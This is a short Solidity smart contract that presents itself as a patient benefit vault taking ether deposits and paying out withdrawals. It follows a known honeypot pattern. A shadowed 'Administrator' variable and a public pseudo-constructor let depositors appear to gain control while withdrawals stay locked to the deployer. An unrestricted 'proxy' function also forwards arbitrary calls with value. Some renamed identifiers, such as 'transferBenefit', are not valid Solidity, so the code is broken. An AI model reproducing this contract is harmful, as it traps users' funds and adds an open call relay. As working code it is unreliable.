pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyAdministrator { if (msg.sender == Administrator) _; } address Administrator = msg.sender;
    function movecoverageManager(address _supervisor) public onlyAdministrator { Administrator = _supervisor; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract PatientvaultProxy is Proxy {
    address public Administrator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function BenefitVault() public payable {
        if (msg.sender == tx.origin) {
            Administrator = msg.sender;
            addCoverage();
        }
    }

    function addCoverage() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function claimBenefit(uint256 amount) public onlyAdministrator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transferBenefit(amount);
        }
    }
}